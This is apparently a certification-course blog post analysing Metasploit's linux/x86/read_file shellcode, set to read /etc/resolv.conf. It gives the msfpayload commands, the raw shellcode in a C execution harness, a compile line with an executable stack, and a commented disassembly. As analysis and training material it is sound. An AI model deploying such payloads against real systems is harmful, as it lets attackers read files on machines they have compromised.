# Assignment #5: Metasploit read_file

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

## Problem

- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
- Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

## Solution

In this assignment we will take up the `linux/x86/read_file` shellcode from Metasploit, as generated by msfpayload. 

For this shellcode to work, we must provide it with a file name. For the purposes of this assignment, we will be reading the DNS configuration file `/etc/resolv.conf`. 


## Analysis

As always, let’s begin by trying to emulate the shellcode with Libemu to see if it can provide us with a nicely structured output of the execution logic. 

```
msfpayload linux/x86/read_file PATH=/etc/resolv.conf R | sctest -Svvvs 100000000000
```

But yet again, it appears to fail to determine the flow. So let’s go ahead and generate the shellcode in C format, append an execution skeleton to it, and run it to see what happens.

```bash
msfpayload linux/x86/read_file PATH=/etc/resolv.conf C > a5-msf_readfile.c
```

#### a5-msf_readfile.c

```c
#include<stdio.h>
#include<string.h>
/*
 * linux/x86/read_file - 78 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, PATH=/etc/resolv.conf, FD=1
 */
unsigned char code[] = \
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x72\x65\x73\x6f\x6c\x76\x2e\x63\x6f"
"\x6e\x66\x00";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

```bash
gcc a5-msf_readfile.c -o a5-msf_readfile -fno-stack-protector -z execstack
```


Disassembling the shellcode with Ndisasm produces a very easy to understand instruction set that can be easily analyzed and understood directly, without the need of GDB. To help understand the instructions, the following C libraries were used

- `/usr/include/i386-linux-gnu/asm/unistd_32.h`
- `/usr/include/asm-generic/fcntl.h`

as well as the Intel Assembly Instruction Set manual

- `64-ia-32-architectures-software-developer-vol-2a-2b-instruction-set-a-z-manual.pdf`

The following is disassembled shellcode commented as part of the analysis:

```
msfpayload linux/x86/read_file PATH=/etc/resolv.conf  R | ndisasm -u -
```

```nasm
00000000  EB36              jmp short 0x38 					; go to stage
00000002  B805000000        mov eax,0x5 					; eax = #define __NR_open 5
00000007  5B                pop ebx 						; ebx = PAYLOAD address (pathname)
00000008  31C9              xor ecx,ecx 					; ecx =  (flags)	#define O_RDONLY        00000000
0000000A  CD80              int 0x80 						; int open(const char *pathname, int flags);
0000000C  89C3              mov ebx,eax 					; ebx = file descriptor (fd)
0000000E  B803000000        mov eax,0x3 					; eax = #define __NR_read 3
00000013  89E7              mov edi,esp 					; edi = top of stack 
00000015  89F9              mov ecx,edi 					; ecx = read into here (buf)
00000017  BA00100000        mov edx,0x1000 					; edx = 0x1000 [4096 bytes] (count)
0000001C  CD80              int 0x80 						; ssize_t read(int fd, void *buf, size_t count);
0000001E  89C2              mov edx,eax 					; edx = size of read data (count)
00000020  B804000000        mov eax,0x4 					; eax = #define __NR_write 4
00000025  BB01000000        mov ebx,0x1 					; ebx = 1 [stdout] (fd)
0000002A  CD80              int 0x80 						; ssize_t write(int fd, const void *buf, size_t count);
0000002C  B801000000        mov eax,0x1 					; eax = #define __NR_exit 1
00000031  BB00000000        mov ebx,0x0 					; ebx = 0 (status)
00000036  CD80              int 0x80 						; void exit(int status);
00000038  E8C5FFFFFF        call dword 0x2 					; put PAYLOAD address on the stack and begin execution

															; PAYLOAD = /etc/resolv.conf (null terminated)
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7265              jc 0xa9
00000044  736F              jnc 0xb5
00000046  6C                insb
00000047  762E              jna 0x77
00000049  636F6E            arpl [edi+0x6e],bp
0000004C  66                o16
0000004D  00                db 0x00
```


## Discussion and Conclusions

Our analysis has revealed how the Metasploit read_file shellcode operates.

This shellcode uses the JMP-CALL-POP technique to get the address of the payload, which in this case is the file name `/etc/resolv.conf`. It then proceeds to create a file descriptor to the file name with the `open()` system call; read 4096 bytes (1 memory page) from it with the `read()` system call; print read bytes to the stdout stream with the `write()` system call; and finally exit gracefully with the `exit()` system call.


## Example

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-5/read_file/example.png "Example")

Note: while executing a5-msf_readfile, the reported shellcode length is 4. This is of course due to the presence of NULL bytes in the shellcode.
